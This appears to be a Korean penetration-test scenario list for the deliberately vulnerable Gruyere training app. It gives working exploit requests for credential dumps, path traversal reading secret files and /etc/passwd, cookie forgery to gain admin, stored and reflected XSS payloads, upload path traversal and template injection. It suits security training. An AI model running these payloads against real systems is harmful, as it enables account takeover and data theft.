# PoC 시나리오 — google-gruyere-trial

각 취약점의 최소 실행 순서. `PoC-코드.md` 의 코드와 1:1 대응.
대상은 방문자별 GID 샌드박스이므로 아래 `<gid>` 는 **본인 인스턴스** 값을 쓴다.
범위: phase 1(시나리오 1~8) + phase 2(시나리오 9~15).

---

## 시나리오 1 — 무인증 전 사용자 자격증명 탈취

1. `GET /start` 로 쿠키를 받고 `GET /<gid>` 로 인스턴스에 들어간다(로그인 불필요, 계정 개설 불필요).
2. `GET /<gid>/dump.gtl` 을 요청한다.
3. 응답의 `_db` 에 `administrator`/`secret`, `brie`/`briebrie`, `cheddar`/`orange`,
   `sardo`/`odras` 의 **평문 비밀번호와 private_snippet** 이 그대로 출력됨을 확인한다.
4. 이 자격증명으로 `GET /<gid>/login?uid=administrator&pw=secret` → 관리자 세션 쿠키 획득.

## 시나리오 2 — 경로 이탈로 서버 시크릿 탈취 (읽기)

1. 쿠키 없이 `GET /<gid>/%2e%2e%2fsecret.txt` 를 보낸다. (`--path-as-is` 필수)
2. 응답 본문이 `Cookie!` (8바이트, `Cookie!\n`) → 서버 `secret.txt` 원문.
   평문 `../` 로 보내면 302 로 정규화되므로 **슬래시까지 인코딩한 형태**를 쓸 것.
3. 같은 방식으로 `GET /<gid>/%2e%2e%2fstored-data.txt` → 픽클로 저장된 DB 파일 전체.
4. `GET /<gid>/../README` 처럼 확장자 없는 파일도 허용된다.

## 시나리오 3 — 쿠키 서명 위조로 인증 완전 우회

1. 시나리오 2로 `cookie_secret = "Cookie!\n"` 을 확보한다.
2. 자기 계정으로 한 번 로그인해 `Set-Cookie: GRUYERE=74315992|brie||author` 를 받아
   서명 알고리즘(`py2_hash(secret + "<uid>|<admin>|<author>") & 0x7FFFFFF`)을 실측 검증한다.
   (4개 계정으로 4/4 일치 확인 — 1개만 맞으면 우연일 수 있으므로 반드시 복수 검증)
3. `GRUYERE=65692386|administrator|admin|author` 를 계산해 `Cookie:` 헤더에 넣고
   `GET /<gid>/dump.gtl` 을 요청한다.
4. 응답의 `_cookie` 가 `{'is_admin': True, 'is_author': True, 'uid': u'administrator'}` →
   **비밀번호를 전혀 몰라도 관리자로 인식**됨을 확인한다.
5. 대조군: `administrator||author` 로 서명하면 `is_admin: False` → 플래그가 내가 넣은
   값에서 온다는 인과관계 확인.

## 시나리오 4 — 매스어사인먼트로 자기 계정 관리자 승격

1. `GET /<gid>/login?uid=brie&pw=briebrie` 로 일반 사용자 세션을 만든다.
2. `GET /<gid>/saveprofile?action=update&uid=brie&is_admin=True&name=Brie`.
3. 같은 세션에서 `GET /<gid>/dump.gtl` → `_profile.is_admin = 'True'` 로 저장됐지만
   `_cookie.is_admin` 은 **아직 False** (플래그는 로그인 시점에 샘플링되기 때문).
4. **재로그인**하면 `Set-Cookie: GRUYERE=72819616|brie|admin|author` →
   `GET /<gid>/manage.gtl` 에서 `Manage this server` 링크가 나타난다.
5. → 권한 상승 완료. (관리자 전용 `/reset`, `/quit` 게이트를 통과하는 상태)

## 시나리오 5 — 저장형 XSS 로 방문자 세션 탈취

1. brie 로 로그인한 뒤 `GET /<gid>/newsnippet2?snippet=<img src=x onerror="...">` 로
   스니펫을 저장한다. (`SanitizeHtml` 블랙리스트에 `onerror` 가 없어 통과)
2. 쿠키 없이 `GET /<gid>/snippets.gtl?uid=brie` 와 `GET /<gid>/` 을 받아
   `<img ... onerror="...">` 가 **이스케이프 없이** 나감을 확인한다.
3. 브라우저로 그 URL 을 연다(로그인 상태).
4. `document.title` 이 페이로드가 지정한 값으로 바뀌고, 주입된 DOM 요소의
   textContent 에 `document.cookie` 값(= `GRUYERE=...`)이 담김을 확인한다.
5. → HttpOnly 부재로 세션 쿠키가 XSS 로 탈취된다.

## 시나리오 6 — 프로필 icon 속성 탈출 저장형 XSS

1. `GET /<gid>/saveprofile?action=update&uid=brie&name=Brie&icon=<payload>` 로
   icon 값에 `x' onerror='...'` 형태를 넣는다.
2. 서버가 홈/스니펫 페이지에서
   `<img alt='' height='32' width='32' src='x' onerror='...'>` 를 렌더함을 확인
   (`src='{{icon:text}}'` 에서 `cgi.escape` 가 따옴표를 이스케이프하지 않음).
3. 다른 방문자가 `GET /<gid>/` 를 여는 것만으로 페이로드가 실행됨을 브라우저로 확인한다.

## 시나리오 7 — 반사형 XSS (경로 / feed.gtl uid)

경로 반사:
1. `GET /<gid>/x%3Cscript%3Edocument.title%3D%27PATH-XSS%27%3C/script%3E`
2. 응답의 `<div class='message'>Invalid request: /x<script>...</script></div>` 를 확인.
3. 브라우저로 같은 URL 을 열면 상호작용 없이 실행된다.

feed.gtl uid (한 파라미터에 3개 문맥):
1. **(a) JS 문자열 문맥** — `GET /<gid>/feed.gtl?uid=x"] , document.title='FEED-XSS' , ["y`
   응답이 `_feed(( [ "x"] , document.title='FEED-XSS' , ["y" ] ))` 형태로 나온다.
   이 URL 을 브라우저로 **직접 열면 실행되지 않는다**(text/html 파싱).
   `/<gid>/snippets.gtl?uid=brie` 를 연 뒤 `_refresh('/<gid>/feed.gtl?uid=<payload>', cb)` 를
   호출하면(Refresh 버튼과 동일 경로) `document.title` 이 바뀐다.
2. **(b) h2 HTML 문맥** — `?uid=zzz<img src=x onerror="document.title='UID-HTML-XSS'">`
   → 페이지 로드만으로 실행된다.
3. **(c) Refresh 링크 onclick 속성** — `?uid=x");document.title=String.fromCharCode(...);void("`
   → 앱 자체 Refresh 버튼을 클릭하면 실행된다. (페이로드에 `'` 를 쓰면 속성이 먼저 끊김)

## 시나리오 8 — 미처리 예외 메시지 노출

1. `GET /<gid>/%2e%2e%2fdata.py%00.txt`
2. 응답에 `Exception: file() argument 1 must be encoded string without null bytes, not str`
   가 200 상태로 그대로 반환됨을 확인한다.

---

# phase 2 시나리오 (Round 6~10)

## 시나리오 9 — 업로드 파일명 경로이탈로 임의 파일 쓰기

1. brie 로 로그인해 세션 쿠키를 만든다(업로드는 로그인이 필요하다).
2. 내용이 `R6-ROOT-WRITE-PROOF` 같은 **식별 가능한 문자열**인 파일을 만든다.
3. `POST /<gid>/upload2` 에 multipart 로 올리되 **filename 에 경로이탈**을 넣는다:
   `-F 'upload_file=@proof.txt;filename=../../r6_root_proof.txt'`
4. 응답이 `File uploaded` 임을 확인한다.
5. `GET /<gid>/%2e%2e%2fr6_root_proof.txt` 로 **그 경로에서 내용을 되읽는다** → 쓰기 성립.
   (읽기는 `%2e%2e%2f` 인코딩이 필요하다)
6. 대조군: 존재하지 않는 파일을 요청하면 200 + `Invalid request` — 즉 **성공 판정은
   상태코드가 아니라 본문**으로 해야 한다.
7. 같은 방식으로 `filename=../cheddar/r6_probe.txt` → `GET /<gid>/cheddar/r6_probe.txt` 도 성립
   (다른 계정의 디렉터리에도 쓸 수 있다).

## 시나리오 10 — 업로드한 `.html` 로 저장형 XSS (경로이탈 불필요)

1. `<script>document.title='HTML-XSS'; ...document.cookie...</script>` 를 담은 `.html` 을
   자기 계정 디렉터리에 업로드한다(`filename=r6upload.html`).
2. `GET /<gid>/brie/r6upload.html` 이 **Content-type 을 그대로 받아 서빙**됨을 확인한다.
3. 로그인한 브라우저(피해자 역할)로 그 URL 을 열면 스크립트가 실행되고
   `document.cookie`(= `GRUYERE=72819616|brie|admin|author`) 가 DOM 에 출력된다.
4. → 파일 업로드 기능이 **저장형 XSS 배포 지점**이 된다. `.html/.htm/.js` 가 대상.

## 시나리오 11 — 업로드한 `.gtl` 로 비인증 전 DB 덤프 (템플릿 주입)

1. 내용이 `{{_db:pprint}}` 인 파일을 `filename=r7.gtl` 로 업로드한다.
2. **쿠키 없이** `GET /<gid>/brie/r7.gtl` 을 요청한다.
3. 응답에 `administrator`/`secret` 등 **전 계정 평문 비밀번호·private_snippet·is_admin**
   이 pprint 로 펼쳐짐을 확인한다.
4. → `.gtl` 은 정적 파일이 아니라 **서버 템플릿으로 렌더**되므로 업로드가 곧 템플릿 주입이다.
   `{{_cookie}}`, `{{_profile}}`, `{{_params}}` 도 같은 방식으로 덤프된다.

## 시나리오 12 — GTL `include` 로 임의 파일 읽기 (화이트리스트 우회)

1. 내용이 아래인 `r7b.gtl` 을 업로드한다(닫는 태그 필수):
   ```
   [[include:../secret.txt]][[/include:../secret.txt]]
   [[include:../data.py]][[/include:../data.py]]
   [[include:../../../../etc/passwd]][[/include:../../../../etc/passwd]]
   ```
2. `GET /<gid>/brie/r7b.gtl` → `Cookie!` / `data.py` 원문 / 시스템 `/etc/passwd` 가 렌더된다.
3. 대조군: 같은 `data.py` 를 정적 경로(`/%2e%2e%2fdata.py`)로 읽으면
   `Unrecognized file type` 으로 **차단**된다 → 템플릿 include 가 별도의 우회 경로임을 확인.
4. → 정적 서빙에만 적용된 확장자 화이트리스트는 템플릿 include 앞에서 무력하다.

## 시나리오 13 — 무인증 임의 계정 프로필 변경 / 권한 상승

1. **쿠키를 전혀 주지 않고** `GET /<gid>/saveprofile?action=update&uid=brie&private_snippet=NOAUTH-PROOF`
   를 보낸다.
2. 302(성공) 응답을 확인한다.
3. `GET /<gid>/dump.gtl` 의 `<pre>` 블록을 파싱해 `brie.private_snippet` 이
   `'NOAUTH-PROOF'` 로 바뀌고 **다른 계정은 무변경**임을 확인한다(→ uid 파라미터가 계정을 지정).
4. 같은 요청에 `is_admin=True` 를 넣으면 임의 계정이 관리자가 된다(소스 확정 — 실제 실행은
   자기 계정 범위에서만).
5. 원상 복구: 같은 무인증 경로로 `private_snippet` 을 원래 값으로 되돌리고 덤프로 재확인.
6. → **CSRF 논의 자체가 불필요하다**(쿠키가 필요 없으므로 SameSite 는 무관).

## 시나리오 14 — 쿠키 구분자 주입으로 관리자 권한 상승

1. 가입 폼 하나로 `uid` 에 구분자 `|` 를 포함한 계정을 만든다:
   `GET /<gid>/saveprofile?action=new&uid=r9poc%7Cadmin%7Cauthor&pw=<8자이상>`
   *(신규 계정 생성은 승인 게이트 대상 — 사용자 승인 후 자기 샌드박스에서만)*
2. 응답 헤더의 `Set-Cookie` 원문을 본다:
   `GRUYERE=<sig>|r9poc|admin|author||; path=/<gid>` → **서버가 스스로 발급**했다.
3. 그 쿠키를 그대로 되돌려 보내 서버 자신의 해석을 확인한다:
   `GET /<gid>/dump.gtl` → `_cookie: {'is_admin': True, 'is_author': True, 'uid': u'r9poc'}`.
4. `GET /<gid>/manage.gtl` → 관리자 전용 `Manage this server` 링크가 렌더된다.
   (비인증은 `Sign in | Sign up` 만 나온다 — `menubar.gtl` 의 `[[if:_cookie.is_admin]]` 조건)
5. DB 대조: 계정 `'r9poc|admin|author'` 는 `is_admin=None` — **DB 에는 권한이 없다**.
   권한은 쿠키 문자열 파싱에서만 나온다.
6. → 시크릿도 모르고 위조도 하지 않은 채 **가입 폼 하나로 관리자**가 된다.

## 시나리오 15 — 살균기(sanitize.py) 우회로 비인증 저장형 XSS

1. 먼저 방어 코드를 오프라인에서 직접 실행해 통과 여부를 표로 확인한다(시나리오 17 표 참고).
2. `<img src="data:image/gif;base64,R0lGODlh...AAA7" OnLoad="document.title='R10-CASE-BYPASS'">`
   를 `newsnippet2` 로 저장한다.
3. `GET /<gid>/feed.gtl?uid=brie` 응답에 **속성이 원문 그대로** 보존됨을 확인한다.
4. **로그인하지 않은 브라우저**로 `GET /<gid>/` (홈)에 접속한다.
5. 헤더가 `Sign in | Sign up` 임에도 `document.title` 이 `"R10-CASE-BYPASS"` 로 바뀌고,
   DOM 의 `<img>` 에 `OnLoad` 속성이 살아 있음을 확인한다.
6. → 살균기를 통과한 핸들러가 **비인증 방문자**에게 실행되는 저장형 XSS.
   (`onload` 는 차단되지만 `OnLoad` 는 통과한다 — HTML 속성명은 대소문자를 구분하지 않는다.)
